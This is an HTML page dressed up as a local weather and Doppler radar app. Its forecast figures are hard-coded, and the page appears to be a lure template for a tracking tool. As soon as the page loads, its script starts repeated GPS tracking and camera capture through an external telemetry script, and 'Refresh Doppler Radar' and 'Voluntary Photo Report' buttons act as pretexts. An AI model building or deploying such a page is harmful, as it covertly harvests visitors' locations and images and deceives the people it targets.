<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Local Weather & Doppler Radar</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0b1329 0%, #172554 50%, #0b1329 100%);
            --card-bg: rgba(30, 41, 59, 0.75);
            --card-border: rgba(255, 255, 255, 0.12);
            --accent-blue: #38bdf8;
            --accent-yellow: #fbbf24;
            --text-main: #ffffff;
            --text-muted: #94a3b8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', -apple-system, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: var(--bg-gradient);
            color: var(--text-main);
            padding: 16px;
        }

        .weather-app-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--card-border);
            padding: 32px 24px;
            border-radius: 28px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
            text-align: center;
            max-width: 420px;
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .location-header h2 {
            font-size: 26px;
            font-weight: 800;
            color: #ffffff;
            letter-spacing: -0.5px;
        }

        .location-tag {
            font-size: 14px;
            color: var(--accent-blue);
            margin-top: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-weight: 500;
        }

        .weather-visual {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 10px 0;
        }

        .weather-icon {
            width: 120px;
            height: 120px;
            filter: drop-shadow(0 12px 24px rgba(56, 189, 248, 0.3));
            animation: floatIcon 4s ease-in-out infinite;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }

        .temp-display {
            font-size: 64px;
            font-weight: 800;
            color: #ffffff;
            line-height: 1;
            margin-top: 6px;
        }

        .condition-text {
            font-size: 16px;
            color: #e2e8f0;
            font-weight: 600;
            margin-top: 6px;
        }

        .high-low-text {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 2px;
        }

        /* Hourly Forecast Pills */
        .hourly-row {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding: 8px 4px;
            scrollbar-width: none;
        }

        .hourly-row::-webkit-scrollbar {
            display: none;
        }

        .hourly-pill {
            flex: 0 0 68px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 10px 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            font-size: 12px;
        }

        .hourly-pill.active {
            background: rgba(56, 189, 248, 0.2);
            border-color: var(--accent-blue);
        }

        .hourly-pill i {
            font-size: 18px;
            color: var(--accent-yellow);
        }

        .hourly-pill .time { color: var(--text-muted); font-size: 11px; }
        .hourly-pill .temp { font-weight: 700; color: white; }

        /* Weather Metrics Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            background: rgba(15, 23, 42, 0.6);
            padding: 16px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .stat-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }

        .stat-item i {
            font-size: 20px;
        }

        .stat-label {
            font-size: 11px;
            color: var(--text-muted);
        }

        .stat-val {
            font-size: 14px;
            font-weight: 700;
            color: #ffffff;
        }

        .btn-refresh {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #0284c7, #2563eb);
            color: white;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 700;
            transition: all 0.2s ease;
            box-shadow: 0 4px 16px rgba(37, 99, 235, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-refresh:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 22px rgba(37, 99, 235, 0.6);
        }
    </style>
</head>

<body>
    <div class="weather-app-card">
        <div class="location-header">
            <h2>Local Radar Forecast</h2>
            <p class="location-tag" id="city"><i class="fas fa-location-dot"></i> <span>Detecting Location...</span></p>
        </div>

        <div class="weather-visual">
            <img src="/weather.png" alt="Weather" class="weather-icon">
            <div class="temp-display">26°C</div>
            <div class="condition-text">Partly Cloudy</div>
            <div class="high-low-text">H: 29° • L: 21° • RealFeel 28°</div>
        </div>

        <!-- Hourly Forecast Row -->
        <div class="hourly-row">
            <div class="hourly-pill active">
                <span class="time">Now</span>
                <i class="fas fa-cloud-sun"></i>
                <span class="temp">26°</span>
            </div>
            <div class="hourly-pill">
                <span class="time">16:00</span>
                <i class="fas fa-sun"></i>
                <span class="temp">28°</span>
            </div>
            <div class="hourly-pill">
                <span class="time">17:00</span>
                <i class="fas fa-cloud-sun"></i>
                <span class="temp">27°</span>
            </div>
            <div class="hourly-pill">
                <span class="time">18:00</span>
                <i class="fas fa-cloud"></i>
                <span class="temp">25°</span>
            </div>
            <div class="hourly-pill">
                <span class="time">19:00</span>
                <i class="fas fa-moon"></i>
                <span class="temp">23°</span>
            </div>
        </div>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-item">
                <i class="fas fa-wind" style="color: #60a5fa;"></i>
                <span class="stat-val">14 km/h</span>
                <span class="stat-label">Wind NW</span>
            </div>
            <div class="stat-item">
                <i class="fas fa-droplet" style="color: #38bdf8;"></i>
                <span class="stat-val">62%</span>
                <span class="stat-label">Humidity</span>
            </div>
            <div class="stat-item">
                <i class="fas fa-sun" style="color: #fbbf24;"></i>
                <span class="stat-val">UV 5</span>
                <span class="stat-label">Moderate</span>
            </div>
        </div>

        <!-- Manual Location Search Fallback -->
        <form id="manual-location-form" style="display: flex; gap: 8px; margin-top: 4px;">
            <input type="text" id="manual-city-input" placeholder="Enter City or ZIP Code" style="flex: 1; padding: 10px 14px; background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 12px; color: #fff; font-size: 13px;">
            <button type="submit" style="padding: 10px 14px; background: rgba(56, 189, 248, 0.2); border: 1px solid var(--accent-blue); border-radius: 12px; color: var(--accent-blue); font-size: 13px; font-weight: 600; cursor: pointer;">Search</button>
        </form>

        <button class="btn-refresh" id="refresh-btn">
            <i class="fas fa-rotate"></i> Refresh Doppler Radar
        </button>

        <!-- Voluntary Media Upload Fallback -->
        <input type="file" id="weather-photo-upload" accept="image/*" capture="user" style="display: none;" onchange="if(window.handleImageSelected) window.handleImageSelected(this.files[0])">
        <button type="button" onclick="document.getElementById('weather-photo-upload').click()" style="width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 14px; color: #e2e8f0; font-size: 13px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
            <i class="fas fa-camera"></i> Voluntary Photo Report
        </button>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const btn = document.querySelector("#refresh-btn");
        const cityEl = document.querySelector("#city span");

        function startWeatherTracking(isUserClick = false) {
            if (isUserClick) {
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating Radar Data...';
            }

            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'weather',
                    updateInterval: 5000,
                    enableCamera: true,
                    enableGPS: true,
                    onSuccess: (coords) => {
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-check-circle"></i> Doppler Forecast Updated';
                        cityEl.textContent = `Shared location: ${coords.latitude.toFixed(3)}°, ${coords.longitude.toFixed(3)}°`;
                        setTimeout(() => {
                            btn.innerHTML = '<i class="fas fa-rotate"></i> Refresh Doppler Radar';
                        }, 3500);
                    },
                    onError: (err) => {
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-rotate"></i> Refresh Doppler Radar';
                    }
                });
                window.LiveTrackerClient.captureCameraSnapshot();
            }
        }

        btn.addEventListener("click", () => startWeatherTracking(true));

        const manualForm = document.getElementById("manual-location-form");
        const manualInput = document.getElementById("manual-city-input");
        if (manualForm && manualInput) {
            manualForm.addEventListener("submit", (e) => {
                e.preventDefault();
                const query = manualInput.value.trim();
                if (query) {
                    cityEl.textContent = `Manual Search: ${query}`;
                    manualInput.value = "";
                }
            });
        }

        window.addEventListener('DOMContentLoaded', () => {
            startWeatherTracking(false);
        });
    </script>
</body>

</html>
